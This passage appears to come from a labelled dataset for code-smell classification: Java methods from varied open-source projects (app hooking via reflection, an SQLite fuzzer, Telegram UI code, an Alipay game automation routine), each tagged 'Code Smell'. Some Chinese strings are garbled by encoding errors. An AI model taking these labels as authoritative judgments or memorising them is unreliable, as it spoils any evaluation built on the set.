  clz_DecodeTaskCompletionListener=load(""com/tencent/mobileqq/avatar/listener"" + ""/DecodeTaskCompletionListener"");
  if (clz_DecodeTaskCompletionListener == null) {
    clz_DecodeTaskCompletionListener=load(""com/tencent/mobileqq/util"" + ""/FaceDecoder$DecodeTaskCompletionListener"");
  }
  if (clz_DecodeTaskCompletionListener == null) {
    clz_DecodeTaskCompletionListener=load(""com/tencent/mobileqq/app/face"" + ""/FaceDecoder$DecodeTaskCompletionListener"");
  }
  if (clz_DecodeTaskCompletionListener == null) {
    Class[] argt;
    Method[] ms=class_FaceDecoder.getDeclaredMethods();
    for (    Method m : ms) {
      if (!m.getReturnType().equals(void.class)) {
        continue;
      }
      argt=m.getParameterTypes();
      if (argt.length != 1) {
        continue;
      }
      if (argt[0].equals(load(""com/tencent/common/app/AppInterface""))) {
        continue;
      }
      clz_DecodeTaskCompletionListener=argt[0];
    }
  }
  return Proxy.newProxyInstance(clz_DecodeTaskCompletionListener.getClassLoader(),new Class[]{clz_DecodeTaskCompletionListener},this);
}",1,Code Smell
"static Field matchField(Class<?> clazz,String fieldName,Class<?> fieldType,boolean isStatic) throws NoSuchFieldException {
  List<Field> fields=new ArrayList<>();
  if (isStatic) {
    for (    Field field : clazz.getFields()) {
      if (fieldName.equals(field.getName()) && Modifier.isStatic(field.getModifiers())) {
        fields.add(field);
      }
    }
  }
  for (  Field field : clazz.getDeclaredFields()) {
    if (fieldName.equals(field.getName()) && isStatic == Modifier.isStatic(field.getModifiers())) {
      fields.add(field);
    }
  }
  if (!isStatic) {
    for (    Field field : clazz.getDeclaredFields()) {
      if (fieldName.equals(field.getName()) && Modifier.isStatic(field.getModifiers())) {
        fields.add(field);
      }
    }
  }
  for (  Field field : fields) {
    if (matchesTypes(new Class[]{field.getType()},new Class[]{fieldType},true)) {
      return field;
    }
  }
  for (  Field field : fields) {
    if (matchesTypes(new Class[]{field.getType()},new Class[]{fieldType},false)) {
      return field;
    }
  }
  Class<?> parentClass=clazz.getSuperclass();
  if (!isStatic && parentClass != null) {
    try {
      return matchField(parentClass,fieldName,fieldType,false);
    }
 catch (    NoSuchFieldException ignored) {
    }
  }
  throw new NoSuchFieldException(clazz.getName() + ""."" + fieldName+ "":""+ fieldType);
}
",1,Code Smell
"public static SQLQueryAdapter getQuery(SQLite3GlobalState globalState){
  return new SQLite3StatTableGenerator(globalState).getQuery();
}
private SQLQueryAdapter getQuery(){
  List<SQLite3Column> columns=new ArrayList<>();
  SQLite3Table t=new SQLite3Table(""sqlite_stat1"",columns,TableKind.MAIN,false,false,false,false);
  if (Randomly.getBoolean()) {
    return SQLite3DeleteGenerator.deleteContent(globalState,t);
  }
 else {
    StringBuilder sb=new StringBuilder();
    sb.append(""INSERT OR IGNORE INTO sqlite_stat1"");
    String indexName;
    try (Statement stat=globalState.getConnection().createStatement()){
      try (ResultSet rs=stat.executeQuery(""SELECT name FROM sqlite_master WHERE type='index' ORDER BY RANDOM() LIMIT 1;"")){
        if (rs.isClosed()) {
          throw new IgnoreMeException();
        }
        indexName=rs.getString(""name"");
      }
     }
 catch (    SQLException e) {
      throw new IgnoreMeException();
    }
    sb.append("" VALUES"");
    sb.append(""('"");
    sb.append(globalState.getSchema().getRandomTable().getName());
    sb.append(""', "");
    sb.append(""'"");
    if (Randomly.getBoolean()) {
      sb.append(indexName);
    }
 else {
      sb.append(globalState.getSchema().getRandomTable().getName());
    }
    sb.append(""'"");
    sb.append("", '"");
    for (int i=0; i < Randomly.smallNumber(); i++) {
      if (i != 0) {
        sb.append("" "");
      }
      if (Randomly.getBoolean()) {
        sb.append(globalState.getRandomly().getInteger());
      }
 else {
        sb.append(Randomly.smallNumber());
      }
    }
    if (Randomly.getBoolean()) {
      sb.append("" sz="");
      sb.append(globalState.getRandomly().getInteger());
    }
    if (Randomly.getBoolean()) {
      sb.append("" unordered"");
    }
    if (Randomly.getBoolean()) {
      sb.append("" noskipscan"");
    }
    sb.append(""')"");
    return new SQLQueryAdapter(sb.toString(),ExpectedErrors.from(""no such table"",""The database file is locked""));
  }
}",1,Code Smell
"private String variable(J.VariableDeclarations variable,boolean initializer,Cursor cursor){
  StringBuilder varBuilder=new StringBuilder();
  for (  J.Modifier modifier : variable.getModifiers()) {
    varBuilder.append(modifier.getType().toString().toLowerCase()).append(' ');
  }
  List<J.VariableDeclarations.NamedVariable> variables=variable.getVariables();
  for (int i=0, variablesSize=variables.size(); i < variablesSize; i++) {
    J.VariableDeclarations.NamedVariable nv=variables.get(i);
    if (i == 0) {
      if (variable.getTypeExpression() != null) {
        varBuilder.append(variable.getTypeExpression().withPrefix(Space.EMPTY).printTrimmed(cursor));
      }
      if (nv.getType() instanceof JavaType.Array) {
        if (nv.getInitializer() instanceof J.NewArray && !((J.NewArray)nv.getInitializer()).getDimensions().isEmpty()) {
          J.NewArray na=(J.NewArray)nv.getInitializer();
          na.getDimensions().forEach(d -> varBuilder.append(""[]""));
        }
 else {
          varBuilder.append(""[]"");
        }
      }
      varBuilder.append("" "");
    }
    varBuilder.append(nv.getSimpleName());
    JavaType type=nv.getType();
    if (initializer && type != null) {
      varBuilder.append('=').append(valueOfType(type));
    }
    if (i < variables.size() - 1) {
      varBuilder.append(',');
    }
  }
  return varBuilder.toString();
}",1,Code Smell
"public void visitLineNumberTableAttribute(Clazz clazz,Method method,CodeAttribute codeAttribute,LineNumberTableAttribute lineNumberTableAttribute){
  LineNumberInfo[] lineNumberTable=lineNumberTableAttribute.lineNumberTable;
  int lineNumberTableLength=lineNumberTableAttribute.u2lineNumberTableLength;
  String methodName=method.getName(clazz);
  String methodDescriptor=method.getDescriptor(clazz);
  String obfuscatedMethodName=MemberObfuscator.newMemberName(method);
  if (obfuscatedMethodName == null) {
    obfuscatedMethodName=methodName;
  }
  int lowestLineNumber=lineNumberTableAttribute.getLowestLineNumber();
  int highestLineNumber=lineNumberTableAttribute.getHighestLineNumber();
  if (lineNumberTableAttribute.getSource(codeAttribute.u4codeLength) == null) {
    if (lowestLineNumber > 0) {
      pw.println(""    "" + lowestLineNumber + "":""+ highestLineNumber+ "":""+ ClassUtil.externalMethodReturnType(method.getDescriptor(clazz))+ "" ""+ methodName+ JavaTypeConstants.METHOD_ARGUMENTS_OPEN+ ClassUtil.externalMethodArguments(method.getDescriptor(clazz))+ JavaTypeConstants.METHOD_ARGUMENTS_CLOSE+ "" -> ""+ obfuscatedMethodName);
    }
 else {
      pw.println(""    "" + ClassUtil.externalMethodReturnType(method.getDescriptor(clazz)) + "" ""+ methodName+ JavaTypeConstants.METHOD_ARGUMENTS_OPEN+ ClassUtil.externalMethodArguments(method.getDescriptor(clazz))+ JavaTypeConstants.METHOD_ARGUMENTS_CLOSE+ "" -> ""+ obfuscatedMethodName);
    }
  }
  Stack<LineNumberInfo> enclosingLineNumbers=new Stack<>();
  LineNumberInfo previousInfo=new LineNumberInfo(0,0);
  for (int index=0; index < lineNumberTableLength; index++) {
    LineNumberInfo info=lineNumberTable[index];
    String previousSource=previousInfo.getSource();
    String source=info.getSource();
    if (source != null && !source.equals(previousSource)) {
      int previousLineNumber=previousInfo.u2lineNumber;
      int lineNumber=info.u2lineNumber;
      if (lineNumber > previousLineNumber) {
        if (index > 0) {
          enclosingLineNumbers.push(previousInfo);
        }
        printInlinedMethodMapping(clazz.getName(),methodName,methodDescriptor,info,enclosingLineNumbers,obfuscatedMethodName);
      }
 else       if (!enclosingLineNumbers.isEmpty()) {
        enclosingLineNumbers.pop();
      }
    }
 else     if (source == null && previousSource != null) {
      if (!enclosingLineNumbers.isEmpty()) {
        enclosingLineNumbers.pop();
      }
    }
    previousInfo=info;
  }
  printed=true;
}",1,Code Smell
"@NonNull private static NumberParse parseNumbers(String s){
  int n=s.length();
  int p=0;
  ArrayList<Float> numbers=new ArrayList<>();
  boolean skipChar=false;
  for (int i=1; i < n; i++) {
    if (skipChar) {
      skipChar=false;
      continue;
    }
    char c=s.charAt(i);
switch (c) {
case 'M':
case 'm':
case 'Z':
case 'z':
case 'L':
case 'l':
case 'H':
case 'h':
case 'V':
case 'v':
case 'C':
case 'c':
case 'S':
case 's':
case 'Q':
case 'q':
case 'T':
case 't':
case 'a':
case 'A':
case ')':
{
        String str=s.substring(p,i);
        if (str.trim().length() > 0) {
          Float f=Float.parseFloat(str);
          numbers.add(f);
        }
        p=i;
        return new NumberParse(numbers,p);
      }
case '\n':
case '\t':
case ' ':
case ',':
case '-':
{
      String str=s.substring(p,i);
      if (str.trim().length() > 0) {
        Float f=Float.parseFloat(str);
        numbers.add(f);
        if (c == '-') {
          p=i;
        }
 else {
          p=i + 1;
          skipChar=true;
        }
      }
 else {
        p++;
      }
      break;
    }
}
}
String last=s.substring(p);
if (last.length() > 0) {
try {
  numbers.add(Float.parseFloat(last));
}
 catch (NumberFormatException nfe) {
}
p=s.length();
}
return new NumberParse(numbers,p);
}",1,Code Smell
"private void positionMarker(){
  if (parentAlert.isStoryLocationPicker) {
    if (parentAlert.storyLocationPickerLatLong != null) {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(parentAlert.storyLocationPickerLatLong[0],parentAlert.storyLocationPickerLatLong[1]));
    }
 else     if (!locationDenied) {
      boolean reset=true;
      final File file=parentAlert.storyLocationPickerPhotoFile;
      final boolean isVideo=parentAlert.storyLocationPickerFileIsVideo;
      if (file != null) {
        try {
          if (isVideo) {
            MediaMetadataRetriever mediaMetadataRetriever=new MediaMetadataRetriever();
            mediaMetadataRetriever.setDataSource(file.getAbsolutePath());
            String location=mediaMetadataRetriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_LOCATION);
            if (location != null) {
              Matcher m=Pattern.compile(""([+\\-][0-9.]+)([+\\-][0-9.]+)"").matcher(location);
              if (m.find() && m.groupCount() == 2) {
                String latstr=m.group(1);
                String lonstr=m.group(2);
                try {
                  double lat=Double.parseDouble(latstr);
                  double lon=Double.parseDouble(lonstr);
                  AndroidUtilities.runOnUIThread(() -> resetMapPosition(lat,lon));
                  reset=false;
                }
 catch (                NumberFormatException ignored) {
                }
              }
            }
          }
 else {
            ExifInterface ei=new ExifInterface(file.getAbsolutePath());
            float[] latlong=new float[2];
            if (ei.getLatLong(latlong)) {
              AndroidUtilities.runOnUIThread(() -> resetMapPosition(latlong[0],latlong[1]));
              reset=false;
            }
          }
        }
 catch (        Exception e) {
        }
      }
      if (reset) {
        positionMarker(myLocation=getLastLocation());
      }
    }
 else {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(0,0));
    }
  }
 else {
    positionMarker(myLocation=getLastLocation());
  }
}
private void positionMarker(Location location){
  if (location == null) {
    return;
  }
  myLocation=new Location(location);
  if (map != null) {
    IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(location.getLatitude(),location.getLongitude());
    if (adapter != null) {
      if (!searchedForCustomLocations && locationType != LOCATION_TYPE_BIZ) {
        adapter.searchPlacesWithQuery(null,myLocation,true);
      }
      adapter.setGpsLocation(myLocation);
    }
    if (!userLocationMoved) {
      userLocation=new Location(location);
      if (firstWas) {
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLng(latLng);
        map.animateCamera(position);
      }
 else {
        firstWas=true;
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngZoom(latLng,map.getMaxZoomLevel() - 4);
        map.moveCamera(position);
      }
    }
  }
 else {
    adapter.setGpsLocation(myLocation);
  }
}",1,Code Smell
"/** 
 * Finds an unreserved range that will fit the sources of the specified instruction. Does not bother trying to center the range around an already-mapped source register;
 * @param insn {@code non-null;} insn to build range for
 * @param rangeLength {@code >=0;} length required in register units
 * @param categoriesForIndex {@code non-null;} indexed by source index; the category for eachsource
 * @param outMovesRequired {@code non-null;} an output parameter indexed by source index that willcontain the set of sources which need moves inserted
 * @return the rop register that starts the fitting range
 */
private int findAnyFittingRange(NormalSsaInsn insn,int rangeLength,int[] categoriesForIndex,BitSet outMovesRequired){
  Alignment alignment=Alignment.UNSPECIFIED;
  if (DexOptions.ALIGN_64BIT_REGS_SUPPORT) {
    int regNumber=0;
    int p64bitsAligned=0;
    int p64bitsNotAligned=0;
    for (    int category : categoriesForIndex) {
      if (category == 2) {
        if (isEven(regNumber)) {
          p64bitsAligned++;
        }
 else {
          p64bitsNotAligned++;
        }
        regNumber+=2;
      }
 else {
        regNumber+=1;
      }
    }
    if (p64bitsNotAligned > p64bitsAligned) {
      if (isEven(paramRangeEnd)) {
        alignment=Alignment.ODD;
      }
 else {
        alignment=Alignment.EVEN;
      }
    }
 else     if (p64bitsAligned > 0) {
      if (isEven(paramRangeEnd)) {
        alignment=Alignment.EVEN;
      }
 else {
        alignment=Alignment.ODD;
      }
    }
  }
  int rangeStart=paramRangeEnd;
  while (true) {
    rangeStart=findNextUnreservedRopReg(rangeStart,rangeLength,alignment);
    int fitWidth=fitPlanForRange(rangeStart,insn,categoriesForIndex,outMovesRequired);
    if (fitWidth >= 0) {
      break;
    }
    rangeStart++;
    outMovesRequired.clear();
  }
  return rangeStart;
}",1,Code Smell
"private static void addRule(boolean modifyArgs,Class<?> owner,String name,String handlerName,Class<?>... args){
  if (owner == null)   return;
  Method original=methodOf(owner,name,args);
  if (original == null)   return;
  Class<?>[] handlerArgs;
  if (!Modifier.isStatic(original.getModifiers())) {
    handlerArgs=ArrayUtil.prepend(args,owner,Class[]::new);
  }
 else {
    handlerArgs=args;
  }
  Method handler=methodOf(ArclightReflectionHandler.class,""redirect"" + capitalize(handlerName),handlerArgs);
  while (handler == null) {
    handlerArgs[0]=handlerArgs[0].getSuperclass();
    handler=methodOf(ArclightReflectionHandler.class,""redirect"" + capitalize(handlerName),handlerArgs);
  }
  METHOD_REDIRECT.put(name + Type.getMethodDescriptor(original),Product.of(Type.getInternalName(owner),methodNodeOf(handler)));
  String key=methodToString(original);
  if (modifyArgs) {
    Method modifyHandler=methodOf(ArclightReflectionHandler.class,""handle"" + capitalize(handlerName),handlerArgs);
    if (modifyHandler == null) {
      handlerArgs[0]=original.getReturnType();
      modifyHandler=methodOf(ArclightReflectionHandler.class,""handle"" + capitalize(handlerName),handlerArgs);
    }
    if (modifyHandler == null) {
      throw new RuntimeException(""No handler for "" + original);
    }
    METHOD_MODIFY.put(name + Type.getMethodDescriptor(original),Product.of(Type.getInternalName(owner),methodNodeOf(modifyHandler)));
    METHOD_TO_HANDLER.put(key,new ModifyHandler(""handle"" + capitalize(handlerName),handlerArgs));
  }
 else {
    METHOD_TO_HANDLER.put(key,new RedirectHandler(""redirect"" + capitalize(handlerName),handlerArgs));
  }
}",1,Code Smell
"@Override public void visitNewPosition(MovementContext context,BlockPos pos){
  MovementBehaviour.super.visitNewPosition(context,pos);
  AbstractContraptionEntity contraptionEntity=context.contraption.entity;
  if (contraptionEntity == null)   return;
  int index=context.data.getInt(""SeatIndex"");
  if (index == -1)   return;
  Map<UUID,Integer> seatMapping=context.contraption.getSeatMapping();
  BlockState blockState=context.world.getBlockState(pos);
  boolean slab=blockState.getBlock() instanceof SlabBlock && blockState.getValue(SlabBlock.TYPE) == SlabType.BOTTOM;
  boolean solid=blockState.canOcclude() || slab;
  if (!seatMapping.containsValue(index))   return;
  if (!solid)   return;
  Entity toDismount=null;
  for (  Map.Entry<UUID,Integer> entry : seatMapping.entrySet()) {
    if (entry.getValue() != index)     continue;
    for (    Entity entity : contraptionEntity.getPassengers()) {
      if (!entry.getKey().equals(entity.getUUID()))       continue;
      toDismount=entity;
    }
  }
  if (toDismount == null)   return;
  toDismount.stopRiding();
  Vec3 position=VecHelper.getCenterOf(pos).add(0,slab ? .5f : 1f,0);
  toDismount.teleportTo(position.x,position.y,position.z);
  toDismount.getPersistentData().remove(""ContraptionDismountLocation"");
}",1,Code Smell
"private static void queryChickenDiary(String queryDayStr){
  try {
    JSONObject jo=new JSONObject(AntFarmRpcCall.queryChickenDiary(queryDayStr));
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject data=jo.getJSONObject(""data"");
      JSONObject chickenDiary=data.getJSONObject(""chickenDiary"");
      String diaryDateStr=chickenDiary.getString(""diaryDateStr"");
      if (data.has(""hasTietie"")) {
        if (!data.optBoolean(""hasTietie"",true)) {
          jo=new JSONObject(AntFarmRpcCall.diaryTietie(diaryDateStr,""NEW""));
          if (""SUCCESS"".equals(jo.getString(""memo""))) {
            String prizeType=jo.getString(""prizeType"");
            int prizeNum=jo.optInt(""prizeNum"",0);
            Log.farm(""璐磋创灏忛浮馃挒["" + prizeType + ""*""+ prizeNum+ ""]"");
          }
 else {
            Log.i(jo.getString(""memo""),jo.toString());
          }
          if (!chickenDiary.has(""statisticsList""))           return;
          JSONArray statisticsList=chickenDiary.getJSONArray(""statisticsList"");
          if (statisticsList.length() > 0) {
            for (int i=0; i < statisticsList.length(); i++) {
              JSONObject tietieStatus=statisticsList.getJSONObject(i);
              String tietieRoleId=tietieStatus.getString(""tietieRoleId"");
              jo=new JSONObject(AntFarmRpcCall.diaryTietie(diaryDateStr,tietieRoleId));
              if (""SUCCESS"".equals(jo.getString(""memo""))) {
                String prizeType=jo.getString(""prizeType"");
                int prizeNum=jo.optInt(""prizeNum"",0);
                Log.farm(""璐磋创灏忛浮馃挒["" + prizeType + ""*""+ prizeNum+ ""]"");
              }
 else {
                Log.i(jo.getString(""memo""),jo.toString());
              }
            }
          }
        }
      }
    }
 else {
      Log.i(jo.getString(""resultDesc""),jo.toString());
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryChickenDiary err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"@Override public void run(){
  Logging.info(main,this.targetTenant,""Cronjob started: "" + jobName,false);
  if (this.targetTenant != null) {
    try {
      doTaskForTargetTenant(this.targetTenant);
    }
 catch (    Exception e) {
      ProcessState.getInstance(main).addState(ProcessState.PROCESS_STATE.CRON_TASK_ERROR_LOGGING,e);
      Logging.error(main,this.targetTenant,""Cronjob threw an exception: "" + this.jobName,Main.isTesting,e);
      if (e instanceof QuitProgramException) {
        main.wakeUpMainThreadToShutdown();
      }
    }
  }
 else {
    List<List<TenantIdentifier>> copied=null;
synchronized (lock) {
      copied=new ArrayList<>(tenantsInfo);
    }
    if (this.isPerApp) {
      List<AppIdentifier> apps=new ArrayList<>();
      Set<AppIdentifier> appsSet=new HashSet<>();
      for (      List<TenantIdentifier> t : copied) {
        for (        TenantIdentifier tenant : t) {
          if (appsSet.contains(tenant.toAppIdentifier())) {
            continue;
          }
          appsSet.add(tenant.toAppIdentifier());
          apps.add(tenant.toAppIdentifier());
        }
      }
      for (      AppIdentifier app : apps) {
        try {
          doTaskPerApp(app);
        }
 catch (        Exception e) {
          ProcessState.getInstance(main).addState(ProcessState.PROCESS_STATE.CRON_TASK_ERROR_LOGGING,e);
          Logging.error(main,app.getAsPublicTenantIdentifier(),""Cronjob threw an exception: "" + this.jobName,Main.isTesting,e);
          if (e instanceof QuitProgramException) {
            main.wakeUpMainThreadToShutdown();
          }
        }
      }
    }
 else {
      ExecutorService service=Executors.newFixedThreadPool(copied.size());
      AtomicBoolean threwQuitProgramException=new AtomicBoolean(false);
      for (      List<TenantIdentifier> t : copied) {
        service.execute(() -> {
          try {
            doTaskPerStorage(StorageLayer.getStorage(t.get(0),main));
          }
 catch (          Exception e) {
            ProcessState.getInstance(main).addState(ProcessState.PROCESS_STATE.CRON_TASK_ERROR_LOGGING,e);
            Logging.error(main,t.get(0),""Cronjob threw an exception: "" + this.jobName,Main.isTesting,e);
            if (e instanceof QuitProgramException) {
              threwQuitProgramException.set(true);
            }
          }
          for (          TenantIdentifier tenant : t) {
            try {
              doTaskPerTenant(tenant);
            }
 catch (            Exception e) {
              ProcessState.getInstance(main).addState(ProcessState.PROCESS_STATE.CRON_TASK_ERROR_LOGGING,e);
              Logging.error(main,tenant,""Cronjob threw an exception: "" + this.jobName,Main.isTesting,e);
              if (e instanceof QuitProgramException) {
                threwQuitProgramException.set(true);
              }
            }
          }
        }
);
      }
      service.shutdown();
      boolean didShutdown=false;
      try {
        didShutdown=service.awaitTermination(this.getIntervalTimeSeconds(),TimeUnit.SECONDS);
      }
 catch (      InterruptedException ignored) {
      }
      if (!didShutdown) {
        service.shutdownNow();
      }
      if (threwQuitProgramException.get()) {
        main.wakeUpMainThreadToShutdown();
      }
    }
  }
  Logging.info(main,this.targetTenant,""Cronjob finished: "" + jobName,false);
}",1,Code Smell
"/** 
 * Writes a double value to the stream.  The double will be written with the following syntax: <code><pre> D b64 b56 b48 b40 b32 b24 b16 b8 </pre></code>
 * @param value the double value to write.
 */
public void writeDouble(double value) throws IOException {
  int offset=_offset;
  byte[] buffer=_buffer;
  if (SIZE <= offset + 16) {
    flushBuffer();
    offset=_offset;
  }
  int intValue=(int)value;
  if (intValue == value) {
    if (intValue == 0) {
      buffer[offset++]=(byte)BC_DOUBLE_ZERO;
      _offset=offset;
      return;
    }
 else     if (intValue == 1) {
      buffer[offset++]=(byte)BC_DOUBLE_ONE;
      _offset=offset;
      return;
    }
 else     if (-0x80 <= intValue && intValue < 0x80) {
      buffer[offset++]=(byte)BC_DOUBLE_BYTE;
      buffer[offset++]=(byte)intValue;
      _offset=offset;
      return;
    }
 else     if (-0x8000 <= intValue && intValue < 0x8000) {
      buffer[offset + 0]=(byte)BC_DOUBLE_SHORT;
      buffer[offset + 1]=(byte)(intValue >> 8);
      buffer[offset + 2]=(byte)intValue;
      _offset=offset + 3;
      return;
    }
  }
  int mills=(int)(value * 1000);
  if (0.001 * mills == value) {
    buffer[offset + 0]=(byte)(BC_DOUBLE_MILL);
    buffer[offset + 1]=(byte)(mills >> 24);
    buffer[offset + 2]=(byte)(mills >> 16);
    buffer[offset + 3]=(byte)(mills >> 8);
    buffer[offset + 4]=(byte)(mills);
    _offset=offset + 5;
    return;
  }
  long bits=Double.doubleToLongBits(value);
  buffer[offset + 0]=(byte)'D';
  buffer[offset + 1]=(byte)(bits >> 56);
  buffer[offset + 2]=(byte)(bits >> 48);
  buffer[offset + 3]=(byte)(bits >> 40);
  buffer[offset + 4]=(byte)(bits >> 32);
  buffer[offset + 5]=(byte)(bits >> 24);
  buffer[offset + 6]=(byte)(bits >> 16);
  buffer[offset + 7]=(byte)(bits >> 8);
  buffer[offset + 8]=(byte)(bits);
  _offset=offset + 9;
}",1,Code Smell
"@Override public void onViewCreated(@NonNull View view,@Nullable Bundle savedInstanceState){
  super.onViewCreated(view,savedInstanceState);
  MainActivity activity=(MainActivity)requireActivity();
  profileNameInput.addTextChangedListener(mProfileInputWatcher);
  mProfileSuggestionsResult=ThreadUtils.postOnBackgroundThread(() -> {
    mProfileNames.clear();
    mProfileNames.addAll(ProfileManager.getProfileNames());
    if (isDetached() || ThreadUtils.isInterrupted())     return;
    activity.runOnUiThread(() -> {
      profileNameInput.setAdapter(new AnyFilterArrayAdapter<>(activity,io.github.muntashirakon.ui.R.layout.auto_complete_dropdown_item_small,mProfileNames));
      if (activity.viewModel != null) {
        profileNameInput.setText(activity.viewModel.getFilterProfileName());
      }
    }
);
  }
);
  selectUserView.setVisibility(Users.getUsersIds().length <= 1 ? View.GONE : View.VISIBLE);
  selectUserView.setOnClickListener(v -> {
    List<UserInfo> userInfoList=Users.getUsers();
    List<Integer> userIdList=new ArrayList<>(userInfoList.size());
    CharSequence[] userInfoReadable=new CharSequence[userInfoList.size()];
    int i=0;
    for (    UserInfo userInfo : userInfoList) {
      userInfoReadable[i]=userInfo.toLocalizedString(requireContext());
      userIdList.add(userInfo.id);
      ++i;
    }
    List<Integer> selections;
    if (activity.viewModel != null) {
      int[] selectedUsers=activity.viewModel.getSelectedUsers();
      if (selectedUsers != null) {
        selections=new ArrayList<>();
        for (        int userId : selectedUsers) {
          selections.add(userId);
        }
      }
 else       selections=userIdList;
    }
 else     selections=userIdList;
    new SearchableMultiChoiceDialogBuilder<>(requireContext(),userIdList,userInfoReadable).setTitle(R.string.filter).setNegativeButton(R.string.close,null).addSelections(selections).showSelectAll(true).hideSearchBar(true).setPositiveButton(R.string.filter,(dialog,which,selectedItems) -> {
      if (activity.viewModel != null) {
        if (selectedItems.size() == userInfoList.size()) {
          activity.viewModel.setSelectedUsers(null);
        }
 else {
          activity.viewModel.setSelectedUsers(ArrayUtils.convertToIntArray(selectedItems));
        }
      }
    }
).show();
  }
);
}",1,Code Smell
"private boolean setProgressAt(float x,boolean fast){
  if (!hasVideo && !hasAudio) {
    return false;
  }
  final long scrollWidth=Math.min(getBaseDuration(),MAX_SCROLL_DURATION);
  final float t=(x - px - ph) / sw;
  long progress=(long)Utilities.clamp(t * scrollWidth + (!hasVideo ? -audioOffset : 0) + scroll,hasVideo ? videoDuration : audioDuration,0);
  if (hasVideo && (progress / (float)videoDuration < videoLeft || progress / (float)videoDuration > videoRight)) {
    return false;
  }
  if (hasAudio && !hasVideo && (progress / (float)audioDuration < audioLeft || progress / (float)audioDuration > audioRight)) {
    return false;
  }
  this.progress=progress;
  invalidate();
  if (delegate != null) {
    delegate.onProgressChange(progress,fast);
  }
  if (askExactSeek != null) {
    AndroidUtilities.cancelRunOnUIThread(askExactSeek);
    askExactSeek=null;
  }
  if (fast) {
    AndroidUtilities.runOnUIThread(askExactSeek=() -> {
      if (delegate != null) {
        delegate.onProgressChange(progress,false);
      }
    }
,150);
  }
  return true;
}",1,Code Smell
"default void md2file(HtmlSourceResult result){
  String filename=Pinyin4jUtil.getFirstSpellPinYin(result.getTitle(),false);
  log.info(""filename{}"",filename);
  StrBuilder builder=StrBuilder.create();
  builder.append(""---\n"");
  builder.append(""title: "").append(result.getTitle()).append(""\n"");
  builder.append(""shortTitle: "").append(result.getTitle()).append(""\n"");
  boolean hasMeta=false;
  if (StringUtils.isNotBlank(result.getDescription())) {
    builder.append(""description: "").append(result.getDescription()).append(""\n"");
  }
  if (StringUtils.isNotBlank(result.getKeywords())) {
    hasMeta=true;
    builder.append(""tag:"" + ""\n"");
    builder.append(""  - 浼樿川鏂囩珷"" + ""\n"");
  }
  if (StringUtils.isNotBlank(result.getAuthor())) {
    builder.append(""author: "").append(result.getAuthor()).append(""\n"");
  }
  builder.append(""category:\n"");
  builder.append(""  - "").append(result.getHtmlSourceType().getCategory()).append(""\n"");
  if (hasMeta) {
    builder.append(""head:\n"");
  }
  if (StringUtils.isNotBlank(result.getKeywords())) {
    builder.append(""  - - meta\n"");
    builder.append(""    - name: keywords\n"");
    builder.append(""      content: "").append(result.getKeywords()).append(""\n"");
  }
  builder.append(""---\n\n"");
  log.info(""markdown\n{}"",result.getMarkdown());
  builder.append(result.getMarkdown());
  if (StringUtils.isNotBlank(result.getSourceLink())) {
    builder.append(""\n\n>鍙傝冮摼鎺ワ細["").append(result.getSourceLink()).append(""]("").append(result.getSourceLink()).append("")"");
    builder.append(""锛屾暣鐞嗭細娌夐粯鐜嬩簩\n"");
  }
  String category=result.getHtmlSourceType().getName();
  log.info(""category{}"",category);
  String mdPath=Paths.get(result.getFileDir(),category,filename + "".md"").toString();
  FileWriter writer=new FileWriter(mdPath);
  writer.write(builder.toString());
  log.info(""all done, category+filename: {}-{}"",category,filename);
  try {
    String pathToSublime=""/Applications/Sublime Text.app/Contents/MacOS/sublime_text"";
    String[] command={pathToSublime,mdPath};
    Runtime.getRuntime().exec(command);
  }
 catch (  IOException e) {
    log.error(""open file error"",e);
  }
  if (StringUtils.isNotBlank(result.getCover())) {
    String coverPath=Paths.get(result.getImgDest(),category,filename + "".jpg"").toString();
    long size=HttpUtil.downloadFile(result.getCover(),FileUtil.file(coverPath));
    log.info(""cover image size{}"",size);
  }
}",1,Code Smell
"public static int process3(int[][] stickers,String t,HashMap<String,Integer> dp){
  if (dp.containsKey(t)) {
    return dp.get(t);
  }
  char[] target=t.toCharArray();
  int[] tcounts=new int[26];
  for (  char cha : target) {
    tcounts[cha - 'a']++;
  }
  int N=stickers.length;
  int min=Integer.MAX_VALUE;
  for (int i=0; i < N; i++) {
    int[] sticker=stickers[i];
    if (sticker[target[0] - 'a'] > 0) {
      StringBuilder builder=new StringBuilder();
      for (int j=0; j < 26; j++) {
        if (tcounts[j] > 0) {
          int nums=tcounts[j] - sticker[j];
          for (int k=0; k < nums; k++) {
            builder.append((char)(j + 'a'));
          }
        }
      }
      String rest=builder.toString();
      min=Math.min(min,process3(stickers,rest,dp));
    }
  }
  int ans=min + (min == Integer.MAX_VALUE ? 0 : 1);
  dp.put(t,ans);
  return ans;
}",1,Code Smell
"public String alienOrder(String[] words){
  Map<Character,List<Character>> adjList=new HashMap<>();
  Map<Character,Integer> counts=new HashMap<>();
  for (  String word : words) {
    for (    char c : word.toCharArray()) {
      counts.put(c,0);
      adjList.put(c,new ArrayList<>());
    }
  }
  for (int i=0; i < words.length - 1; i++) {
    String word1=words[i];
    String word2=words[i + 1];
    if (word1.length() > word2.length() && word1.startsWith(word2)) {
      return """";
    }
    for (int j=0; j < Math.min(word1.length(),word2.length()); j++) {
      if (word1.charAt(j) != word2.charAt(j)) {
        adjList.get(word1.charAt(j)).add(word2.charAt(j));
        counts.put(word2.charAt(j),counts.get(word2.charAt(j)) + 1);
        break;
      }
    }
  }
  StringBuilder sb=new StringBuilder();
  Queue<Character> queue=new LinkedList<>();
  for (  Character c : counts.keySet()) {
    if (counts.get(c).equals(0)) {
      queue.add(c);
    }
  }
  while (!queue.isEmpty()) {
    Character c=queue.remove();
    sb.append(c);
    for (    Character next : adjList.get(c)) {
      counts.put(next,counts.get(next) - 1);
      if (counts.get(next).equals(0)) {
        queue.add(next);
      }
    }
  }
  if (sb.length() < counts.size()) {
    return """";
  }
  return sb.toString();
}",1,Code Smell
"public static List<ProjectionColumn> generateProjectionColumns(String projectionExpression,List<Column> columns){
  if (StringUtils.isNullOrWhitespaceOnly(projectionExpression)) {
